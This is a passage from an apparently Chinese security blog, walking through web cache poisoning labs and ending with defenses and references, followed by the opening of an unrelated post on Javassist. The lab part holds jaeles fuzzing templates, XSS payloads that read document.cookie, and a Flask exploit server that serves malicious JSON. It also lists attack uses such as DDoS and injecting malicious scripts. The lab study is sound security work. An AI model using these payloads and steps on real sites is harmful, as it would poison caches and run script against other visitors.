<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">id:</span> <span class="string">x-forwarded-scheme-302.yaml</span></span><br><span class="line"><span class="attr">type:</span> <span class="string">fuzz</span></span><br><span class="line"><span class="attr">info:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">X-Forwarded-Scheme</span> <span class="number">302</span> <span class="string">redirect</span></span><br><span class="line">  <span class="attr">risk:</span> <span class="string">Low</span></span><br><span class="line"></span><br><span class="line"><span class="attr">payloads:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">&gt;-</span></span><br><span class="line"><span class="string">    http</span></span><br><span class="line"><span class="string"></span>  <span class="bullet">-</span> <span class="string">&gt;-</span></span><br><span class="line"><span class="string">    https</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="attr">requests:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">generators:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">Header(&quot;&#123;&#123;.payload&#125;&#125;&quot;,</span> <span class="string">&quot;X-Forwarded-Scheme&quot;</span><span class="string">)</span></span><br><span class="line">    <span class="attr">detections:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&gt;-</span></span><br><span class="line">        <span class="string">StatusCode()</span> <span class="string">==</span> <span class="number">302</span></span><br></pre></td></tr></table></figure>

<p>插件说明</p>
<blockquote>
<p>给请求头分别添加”X-Forwarded-Scheme: http” 和”X-Forwarded-Scheme: https” 。查看是否有302跳转。</p>
</blockquote>
<p>对靶场地址测试后，插件成功检测到了相关安全问题(同样如果是缓存导致的跳转，要多次测试才能命中缓存)。</p>
<p><img src="../images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210130110131055.png" alt="image-20210130110131055"></p>
<p>接下来就是手工验证了。</p>
<p><img src="../images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210130110228316.png" alt="image-20210130110228316"></p>
<p>如上图，我们设置了一个example.com。重定向了example.com。由于命中缓存后，后续用户都会被重定向到example.com。像这种我们可以怎么样来利用呢？</p>
<blockquote>
<ol>
<li>如果是一个访问量极大的站，我们可以用来进行ddos攻击</li>
<li>我们可以把地址设置成恶意服务器来引入恶意脚本</li>
<li>用来做seo优化 </li>
</ol>
</blockquote>
<h3 id="3-6-猜测请求头投毒"><a href="#3-6-猜测请求头投毒" class="headerlink" title="3.6 猜测请求头投毒"></a>3.6 猜测请求头投毒</h3><p>本实验unkey存在于请求头的X-Host参数，而这这个参数并不存在于HTTP协议，所以我们需要猜测。根据<a href="https://github.com/PortSwigger/param-miner">param Miner</a>的字典进行简化，编写了如下的测试脚步来进行Header的枚举，进行粗略检测。</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">id:</span> <span class="string">simple-guess-headers</span></span><br><span class="line"><span class="attr">type:</span> <span class="string">fuzz</span></span><br><span class="line"><span class="attr">level:</span> <span class="number">1</span></span><br><span class="line"><span class="attr">info:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">simple</span> <span class="string">Guess</span> <span class="string">headers</span> </span><br><span class="line">  <span class="attr">risk:</span> <span class="string">Low</span></span><br><span class="line"></span><br><span class="line"><span class="attr">variables:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">ran:</span> <span class="string">RandomString(4)</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">head:</span> <span class="string">|</span></span><br><span class="line"><span class="string">      accept</span></span><br><span class="line"><span class="string">      accept-charset</span></span><br><span class="line"><span class="string">      accept-encoding</span></span><br><span class="line"><span class="string">      accept-language</span></span><br><span class="line"><span class="string">      x-host</span></span><br><span class="line"><span class="string">      x-forward-for</span></span><br><span class="line"><span class="string">      x-forwarded-host</span></span><br><span class="line"><span class="string">      x-forwarded-scheme</span></span><br><span class="line"><span class="string">      authorization</span></span><br><span class="line"><span class="string">      cache-control</span></span><br><span class="line"><span class="string">      connection</span></span><br><span class="line"><span class="string">      content-location</span></span><br><span class="line"><span class="string">      content-type</span></span><br><span class="line"><span class="string">      cookie</span></span><br><span class="line"><span class="string">      expires</span></span><br><span class="line"><span class="string">      forwarded</span></span><br><span class="line"><span class="string">      from</span></span><br><span class="line"><span class="string">      proxy-authenticate</span></span><br><span class="line"><span class="string">      proxy-authorization</span></span><br><span class="line"><span class="string">      server</span></span><br><span class="line"><span class="string">      set-cookie</span></span><br><span class="line"><span class="string">      user-agent</span></span><br><span class="line"><span class="string">      x-forwarded-protocol</span></span><br><span class="line"><span class="string">      x-original-url</span></span><br><span class="line"><span class="string">      x-rewrite-url</span></span><br><span class="line"><span class="string">      client-ip</span></span><br><span class="line"><span class="string">      x-real-ip</span></span><br><span class="line"><span class="string">      x-originating-ip</span></span><br><span class="line"><span class="string">      uri</span></span><br><span class="line"><span class="string">      x-authentication</span></span><br><span class="line"><span class="string">      x-authentication-key</span></span><br><span class="line"><span class="string">      x-authorization</span></span><br><span class="line"><span class="string">      x-auth-token</span></span><br><span class="line"><span class="string">      proxy-http</span></span><br><span class="line"><span class="string">      proxy-socks4</span></span><br><span class="line"><span class="string">      proxy-socks5</span></span><br><span class="line"><span class="string">      redirect</span></span><br><span class="line"><span class="string">      method</span></span><br><span class="line"><span class="string">      x-forwarded-server</span></span><br><span class="line"><span class="string">      Origin</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="attr">payloads:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">&#x27;<span class="template-variable">&#123;&#123;.head&#125;&#125;</span>&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="attr">requests:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">generators:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">Header(&quot;headereflect&#123;&#123;.ran&#125;&#125;&quot;,</span> <span class="string">&quot;<span class="template-variable">&#123;&#123;.payload&#125;&#125;</span>&quot;</span><span class="string">)</span></span><br><span class="line">    <span class="attr">detections:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&gt;-</span></span><br><span class="line">        <span class="string">StringSearch(&quot;response&quot;,</span> <span class="string">&quot;headereflect&quot;</span><span class="string">)</span></span><br></pre></td></tr></table></figure>

<p>检测到x-host参数后当然可以直接投毒，但是这里这个案例可以通过User-Agent实现定向投毒的，在返回包</p>
<p><img src="../images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210130170904429.png" alt="image-20210130170904429"></p>
<p>我们可以看到一个字段 “Vary: User-Agent”。Vary就是用来表明额外将谁加入cache key的。这里的意思是User-Agent也会加入到cache key 中，如果我们指定一个比较通用的User-Agent就会给很多用户投毒，如果指定某个特定用户的User-Agent我们就可以针对性的投毒。</p>
<p>本题中，我们可以在留言处插入一段如下脚步，让别人访问自己的网站，从而拿到他人的User-Agent，从而实现定向攻击。</p>
<p><img src="../images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210201090054053.png" alt="image-20210201090054053"></p>
<h3 id="3-7-DOM投毒"><a href="#3-7-DOM投毒" class="headerlink" title="3.7 DOM投毒"></a>3.7 DOM投毒</h3><p>用前面编写的插件直接对靶机发起漏洞探测。很块就发现了一个X-Forwarded-Host回显的问题。</p>
<p><img src="../images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210202151540464.png" alt="image-20210202151540464"></p>
<p>之前写的两个插件都检测到了，guess-headers是爆破header字段的，里面也有X-Forwarded-Host，当然也能检测到。我们看一下数据包，明显有X-Forwarded-Host回显问题。但这只是个潜在问题，并不能说明有安全问题。</p>
<p><img src="../images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210202151922285.png" alt="image-20210202151922285"></p>
<p>放入BurpSuite 进行手工测试。为了不影响其他用户，设置一个不存在的资源(<code>/?test=1</code>)进行投毒。重复发包，直到<code>X-Cache: hit</code>命中缓存。（如果响应包有Set-Cookie不能真的存入缓存中，找一个有cookie的请求来测试）</p>
<p><img src="../images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210202153512601.png" alt="image-20210202153512601"></p>
<p>复制url地址，在浏览器中访问，投毒成功。</p>
<p><img src="../images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210202163616096.png" alt="image-20210202163616096"></p>
<p>这次靶场与前面不同的是可控值存入到了json中。没办法直接插入xss paylod。我们需要找到其他利用点。</p>
<p>目前我们已知一个可控点，下一步，我们看一下此可控点是否被引用。</p>
<p>在返回包里搜索data，可以发现<code>initGeoLocate()</code>是有引用的，这也许就是突破点。</p>
<p><img src="../images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210201141404173.png" alt="image-20210201141404173"></p>
<p>我们不妨把完整的url给它拼接出来<a href="https://ac711f051e66707780530770007a000c.web-security-academy.net/resources/json/geolocate.json%EF%BC%8C%E8%AE%BF%E9%97%AE%E5%90%8E%E5%8F%91%E7%8E%B0%E5%A6%82%E4%B8%8Bjson%E6%95%B0%E6%8D%AE%E3%80%82">https://ac711f051e66707780530770007a000c.web-security-academy.net/resources/json/geolocate.json，访问后发现如下json数据。</a></p>
<p><img src="../images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210201141629661.png" alt="image-20210201141629661"></p>
<p>我们回到浏览器研究一下这个函数<code>initGeoLocate()</code>函数。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">initGeoLocate</span>(<span class="params">jsonUrl</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    fetch(jsonUrl)</span><br><span class="line">        .then(<span class="function"><span class="params">r</span> =&gt;</span> r.json())</span><br><span class="line">        .then(<span class="function"><span class="params">j</span> =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">let</span> geoLocateContent = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;shipping-info&#x27;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">let</span> img = <span class="built_in">document</span>.createElement(<span class="string">&quot;img&quot;</span>);</span><br><span class="line">            img.setAttribute(<span class="string">&quot;src&quot;</span>, <span class="string">&quot;/resources/images/localShipping.svg&quot;</span>);</span><br><span class="line">            geoLocateContent.appendChild(img)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">let</span> div = <span class="built_in">document</span>.createElement(<span class="string">&quot;div&quot;</span>);</span><br><span class="line">            div.innerHTML = <span class="string">&#x27;Free shipping to &#x27;</span> + j.country;</span><br><span class="line">            geoLocateContent.appendChild(div)</span><br><span class="line">        &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>该函数拿到上图所示json数据。然后<code>div.innerHTML = &#39;Free shipping to &#39; + j.country;</code>中将country的值输出到DOM节点<code>shipping-info</code>中。</p>
<p>从如上分析，我们可控的<code>X-Forwarded-Host</code>的值被传递到data中，然后又被作为参数传递到<code>initGeoLocate()</code>中。并且<code>initGeoLocate()</code>从我们可控的url中取出参数输出到DOM节点中。</p>
<p>由此，我们可以构造恶意的json数据，并且将恶意数据的url存到缓存中，这样，只有有人访问该页面，就会加载恶意的json数据并且执行</p>
<p><strong>攻击步骤：</strong></p>
<ol>
<li><p>在可控的服务器上构造一个xss payload。下图是靶场提供的利用服务器。注意使用<code>Access-Control-Allow-Origin: *</code>来避免跨域问题。</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">/resources/<span class="type">json</span>/geolocate.json</span><br><span class="line"><span class="keyword">Access</span>-Control-Allow-Origin: *</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">&quot;country&quot;: &quot;&lt;img src=1 onerror=alert(document.cookie) /&gt;&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
<p><img src="../images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210202164838827.png" alt="image-20210202164838827"></p>
<p>只要访问该资源就被攻击。</p>
<p><img src="../images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210202165248679.png" alt="image-20210202165248679"></p>
<p>在自己的vps上也写了一个exp。但是可能是实验环境的限制，没有加载成功。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, jsonify</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/resources/json/geolocate.json&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">root</span>():</span></span><br><span class="line">    t = &#123;</span><br><span class="line">        <span class="string">&#x27;country&#x27;</span>: <span class="string">&#x27;&lt;img src=a onerror=alert(document.domain)&gt;&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> jsonify(t), <span class="number">200</span>, [(<span class="string">&quot;Access-Control-Allow-Origin&quot;</span>, <span class="string">&quot;*&quot;</span>)]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.debug = <span class="literal">True</span></span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">4445</span>)</span><br></pre></td></tr></table></figure>





<h3 id="3-8-畸形请求导致投毒"><a href="#3-8-畸形请求导致投毒" class="headerlink" title="3.8 畸形请求导致投毒"></a>3.8 畸形请求导致投毒</h3><p>本实验是通过不规范的HTTP请求导致的投毒攻击，首先查看主页，其中callback函数是需要注意的问题，</p>
<p><img src="../images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210222141653763.png" alt="image-20210222141653763"></p>
<p>单独访问<code>js/geolocate.js?callback=setCountryCookie</code>，修改callback的值，返回内容也会改变。但是callback的值是cache key。没有办法利用。</p>
<p><img src="../images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210222142043129.png" alt="image-20210222142043129"></p>
<p><img src="../images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210222142632400.png" alt="image-20210222142632400"></p>
<p>返回内容如下，</p>
<figure class="highlight coffeescript"><table><tr><td class="code"><pre><span class="line">const setCountryCookie = <span class="function"><span class="params">(country)</span> =&gt;</span> &#123; <span class="built_in">document</span>.cookie = <span class="string">&#x27;country=&#x27;</span> + country; &#125;;</span><br><span class="line">const setLangCookie = <span class="function"><span class="params">(lang)</span> =&gt;</span> &#123; <span class="built_in">document</span>.cookie = <span class="string">&#x27;lang=&#x27;</span> + lang; &#125;;</span><br><span class="line">setCountryCookie(&#123;<span class="string">&quot;country&quot;</span>:<span class="string">&quot;United Kingdom&quot;</span>&#125;);</span><br></pre></td></tr></table></figure>



<p><code>&lt;script type=&quot;text/javascript&quot; src=&quot;/js/geolocate.js?callback=setCountryCookie&quot;&gt;&lt;/script&gt;</code></p>
<p>会拿回: <code>setCountryCookie(&#123;&quot;country&quot;:&quot;United Kingdom&quot;&#125;);</code></p>
<p>最终成为:</p>
<p><code>&lt;script type=&quot;text/javascript&quot;&gt;setCountryCookie(&#123;&quot;country&quot;:&quot;United Kingdom&quot;&#125;);&lt;/script&gt;</code></p>
<p>但是如果不放弃，深入测试就会发现。虽然在get请求是cache key，但是在post里添加相同的参数却是unkeyed。构造payload: <code>callback=alert(1)</code>，重复请求直到命中缓存。</p>
<p><img src="../images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210222145309155.png" alt="image-20210222145309155"></p>
<p><img src="../images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210222144410773.png" alt="image-20210222144410773"></p>
<h3 id="3-9-通过url参数投毒"><a href="#3-9-通过url参数投毒" class="headerlink" title="3.9 通过url参数投毒"></a>3.9 通过url参数投毒</h3><p>本实验中url参数是unkeyed。编写一个get请求的插件，随意添加几个参数，如果添加的参数值回显在响应中，那么就手工测试是否能够进一步利用。</p>
<p>jaeles插件代码如下</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">id:</span> <span class="string">simple-add-getquery-reflect</span></span><br><span class="line"><span class="attr">level:</span> <span class="number">1</span></span><br><span class="line"><span class="attr">info:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">simple</span> </span><br><span class="line">  <span class="attr">risk:</span> <span class="string">low</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="attr">params:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">root:</span> <span class="string">&#x27;<span class="template-variable">&#123;&#123;.BaseURL&#125;&#125;</span>&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="attr">variables:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">vars:</span> <span class="string">|</span></span><br><span class="line"><span class="string">      test</span></span><br><span class="line"><span class="string">      utm%5fcontent</span></span><br><span class="line"><span class="string">      redirect</span></span><br><span class="line"><span class="string">      url</span></span><br><span class="line"><span class="string"></span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">check:</span> <span class="string">|</span></span><br><span class="line"><span class="string">      saddgetqueryreflect</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="attr">requests:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">method:</span> <span class="string">GET</span></span><br><span class="line">    <span class="attr">redirect:</span> <span class="literal">false</span></span><br><span class="line">    <span class="attr">headers:</span> </span><br><span class="line">      <span class="bullet">-</span> <span class="attr">User-Agent:</span> <span class="string">Mozilla/5.0</span> <span class="string">(Macintosh;</span> <span class="string">Intel</span> <span class="string">Mac</span> <span class="string">OS</span> <span class="string">X</span> <span class="number">10.15</span><span class="string">;</span> <span class="string">rv:85.0)</span> <span class="string">Gecko/20100101</span> <span class="string">Firefox/85.0</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">&gt;-</span></span><br><span class="line"><span class="string">      &#123;&#123;.root&#125;&#125;/?&#123;&#123;.vars&#125;&#125;=&#123;&#123;.check&#125;&#125;</span></span><br><span class="line"><span class="string"></span>    </span><br><span class="line">    <span class="attr">detections:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&gt;-</span></span><br><span class="line">        <span class="string">StringSearch(&quot;response&quot;,</span> <span class="string">&quot;saddgetqueryreflect&quot;</span><span class="string">)</span></span><br></pre></td></tr></table></figure>

<p>插件逻辑很简单，就是在URL后面跟几个参数，看看参数的值是否会出现在response中。</p>
<p><img src="../images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210204100506511.png" alt="image-20210204100506511"></p>
<p>通过插件确实能检测到，现在我们手工验证一下，确实有回显。</p>
<p><img src="../images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210204100805897.png" alt="image-20210204100805897"></p>
<p>接下来将unkeyed参数注入到缓存，然后去掉unkeyed参数，检测是否还能收到带有unkey参数的响应。</p>
<p><img src="../images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210204105734286.png" alt="image-20210204105734286"></p>
<p>去掉之后任然收到了带有unkey参数的响应，那么接下来就是如何来恶意利用。</p>
<p>首先还是来进行xss payload注入。</p>
<p><img src="../images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210204110117141.png" alt="image-20210204110117141"></p>
<p>访问会自动加上xss payload</p>
<p><img src="../images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210204110226548.png" alt="image-20210204110226548"></p>
<h3 id="3-10-利用缓存绕过编码限制-URL-normalization"><a href="#3-10-利用缓存绕过编码限制-URL-normalization" class="headerlink" title="3.10 利用缓存绕过编码限制(URL normalization)"></a>3.10 利用缓存绕过编码限制(<strong>URL normalization</strong>)</h3><p>用一个检查路径回显的插件检测到了路径回显问题，插件如下</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">id:</span> <span class="string">path-reflect</span></span><br><span class="line"><span class="attr">info:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">path</span> <span class="string">reflect</span></span><br><span class="line">  <span class="attr">risk:</span> <span class="string">info</span></span><br><span class="line"></span><br><span class="line"><span class="attr">variables:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">ran:</span> <span class="string">RandomString(6)</span></span><br><span class="line"></span><br><span class="line"><span class="attr">params:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">root:</span> <span class="string">&#x27;<span class="template-variable">&#123;&#123;.BaseURL&#125;&#125;</span>&#x27;</span></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="attr">requests:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">method:</span> <span class="string">GET</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">&gt;-</span></span><br><span class="line"><span class="string">      &#123;&#123;.root&#125;&#125;/&#123;&#123;.ran&#125;&#125;</span></span><br><span class="line"><span class="string"></span>    <span class="attr">headers:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">User-Agent:</span> <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55&#x27;</span></span><br><span class="line">    <span class="attr">detections:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&gt;-</span></span><br><span class="line"><span class="string">        StringSearch(&quot;response&quot;, &quot;&#123;&#123;.ran&#125;&#125;&quot;)</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>

<p>手工探测也发现了该问题，</p>
<p> <img src="../images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210207111457635.png" alt="image-20210207111457635"></p>
<p>既然有回显，肯定试一下XSS攻击。插入payload:</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>发现返回结果是编码后的结果。多次请求，命中缓存还是编码后的结果。由于发送请求时候浏览器会自动加一层URL编码</p>
<p>是没办法直接进行XSS攻击的。</p>
<p> <img src="../images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210207111614903.png" alt="image-20210207111614903"></p>
<p>转换一下思路，存在缓存，那如果我们把为未编码的payload插入缓存，那么我们请求缓存未编码的payload。就能触发payload。</p>
<ol>
<li><p>通过BurpSuite将未编码的 payload注入缓存。</p>
<p><img src="../images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210207131145356.png" alt="image-20210207131145356"></p>
</li>
</ol>
<p>2 . 再在浏览器中请求地址，成功触发payload。</p>
<p><img src="../images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210207131104220.png" alt="image-20210207131104220"></p>
<h3 id="3-11-内部缓存中毒"><a href="#3-11-内部缓存中毒" class="headerlink" title="3.11 内部缓存中毒"></a>3.11 内部缓存中毒</h3><p>打开实验环境，通过拦截数据包，发现似乎没有缓存。</p>
<p><img src="../images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210216090500297.png" alt="image-20210216090500297"></p>
<p>通过之前编写的插件检测，发现参数污染 x-forwarded-host头等回显问题。</p>
<p><img src="../images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210216090542129.png" alt="image-20210216090542129"></p>
<p>本例中我们显然要找到缓存的地方才行。通过添加x-forwarded-host头。X-Forwarded-Host: your-exploit-server</p>
<p>在自己的服务器上观察收到的请求，发现有三处请求，并且响应包中也有三处回显，其中geolocate.js的请求在我们删除X-Forwarded-Host头后还是会请求，说明这种是缓存在内部，我们通过在自己的服务器上构造利用payload，就可以利用该漏洞。</p>
<p><img src="../images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210216091300459.png" alt="image-20210216091300459"></p>
<h2 id="4-防御"><a href="#4-防御" class="headerlink" title="4. 防御"></a>4. 防御</h2><ul>
<li><p>终极方案就是关闭缓存，但对很多网站来说并不现实，实际可能需要变通。比如你使用缓存仅仅是因为CDN默认就是开着的，这时候可以考虑是否真的需要这个功能。</p>
</li>
<li><p>就算是真的需要使用缓存，也要限制在静态资源上，在后端服务器做好检测，避免将恶意内容返回给缓存。</p>
</li>
<li><p>如果使用外部供应商的缓存，不仅要修改默认配置，还要查看CDN支持那些请求头，因为很多web缓存投毒攻击都是出现在一些不常用的请求头上。</p>
</li>
</ul>
<p>在使用缓存时，你应该采用如下的一些防御方案</p>
<ul>
<li>如果出于性能考虑不使用某些缓存键，就重写请求，不要直接配置，这样很容易导致unkeyed。</li>
<li>不要接受畸形HTTP请求，使用的某些外部供应商的技术可能默认支持各种不规范的HTTP请求。</li>
<li>不要忽视客户端漏洞，因为客户端漏洞结合缓存会变成威力巨大的漏洞。</li>
</ul>
<h2 id="5-参考"><a href="#5-参考" class="headerlink" title="5. 参考"></a>5. 参考</h2><ul>
<li> black hat议题白皮书：<a href="https://i.blackhat.com/USA-20/Wednesday/us-20-Kettle-Web-Cache-Entanglement-Novel-Pathways-To-Poisoning-wp.pdf">https://i.blackhat.com/USA-20/Wednesday/us-20-Kettle-Web-Cache-Entanglement-Novel-Pathways-To-Poisoning-wp.pdf</a></li>
<li> black hat议题ppt:<a href="https://i.blackhat.com/USA-20/Wednesday/us-20-Kettle-Web-Cache-Entanglement-Novel-Pathways-To-Poisoning.pdf">https://i.blackhat.com/USA-20/Wednesday/us-20-Kettle-Web-Cache-Entanglement-Novel-Pathways-To-Poisoning.pdf</a></li>
<li> <a href="https://portswigger.net/research/practical-web-cache-poisoning">https://portswigger.net/research/practical-web-cache-poisoning</a></li>
<li> <a href="https://ph4ntonn.github.io/Web-Cache-Poisoning.html">https://ph4ntonn.github.io/Web-Cache-Poisoning.html</a></li>
<li> <a href="https://medium.com/@m01e/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92-%E6%9C%AA%E5%AE%8C%E6%88%90%E7%89%88-4e5a1cfd2c58">https://medium.com/@m01e/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92-%E6%9C%AA%E5%AE%8C%E6%88%90%E7%89%88-4e5a1cfd2c58</a></li>
<li> <a href="https://www.4hou.com/posts/RwoL">https://www.4hou.com/posts/RwoL</a></li>
<li> <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Caching_FAQ">https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Caching_FAQ</a></li>
<li> <a href="https://segmentfault.com/a/1190000009638800">https://segmentfault.com/a/1190000009638800</a></li>
<li> <a href="https://segmentfault.com/a/1190000021060741">https://segmentfault.com/a/1190000021060741</a></li>
<li> <a href="https://portswigger.net/research/responsible-denial-of-service-with-web-cache-poisoning">https://portswigger.net/research/responsible-denial-of-service-with-web-cache-poisoning</a></li>
<li> <a href="https://cpdos.org/">https://cpdos.org/</a></li>
</ul>
]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>web漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>java类字节码编辑</title>
    <url>/java%E7%B1%BB%E5%AD%97%E8%8A%82%E7%A0%81%E7%BC%96%E8%BE%91/</url>
    <content><![CDATA[<blockquote>
<p>道可道，非常道；名可名，非常名。</p>
</blockquote>
<p>Javassist学习</p>
<span id="more"></span>



<h2 id="1-Javassist"><a href="#1-Javassist" class="headerlink" title="1. Javassist"></a>1. Javassist</h2><p>Javassist比ASM更适合人类操纵字节码，使用API可以实现例如生成类、修改类的操作。</p>
<p>Javassist是一种字节码增加技术。我们最常用的 Java Proxy 也是一种增强技术，另外常用的还有 ASM，AspectJ，Javassist等常用的技术，其中ASM在指令层次操作字节码的，需要对JVM的指令有一定的了解，同时众多的指令也很难记住，操作比较高；AspectJ扩展了 Java，定义了一些专门的AOP语法，其中 Spring AOP 就使用了 AspectJ；Javassist 是强调源代码层次操作字节码的框架，操作起来很容易入手。</p>
<p>提供了2各层次的API：源码级别、字节码级别。</p>
<p>优势：</p>
<ul>
<li>操作简单，容易上手</li>
<li>性能高于反射</li>
</ul>
<p>缺点：</p>
<ul>
<li>性能相比 ASM ，会低一些</li>
<li>不支持 continue 和 break 表达式，不支持内部类和匿名类，因此在有些场景是不适合的</li>
</ul>
<p><a href="http://www.javassist.org/html/index.html">API文档</a></p>
